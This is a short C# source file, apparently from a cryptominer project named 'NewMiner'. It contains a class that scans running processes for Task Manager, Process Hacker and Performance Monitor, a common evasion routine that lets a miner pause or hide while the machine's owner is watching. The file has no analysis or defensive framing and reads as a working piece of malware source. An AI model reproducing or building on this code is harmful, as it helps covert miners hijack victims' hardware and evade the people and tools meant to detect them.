using System.Diagnostics;

namespace NewMiner
{
    internal class CheckTaskMgr
    {
        public static bool Start()
        {
            var process = Process.GetProcesses();
            foreach (var pro in process)
            {
                if (pro.ProcessName == "Taskmgr" || pro.ProcessName == "taskmgr"
                    || pro.ProcessName == "ProcessHacker" || pro.ProcessName == "processhacker"
                    || pro.ProcessName == "perfmon")
                {
                    return true;
                }
            }
            return false;
        }
    }
}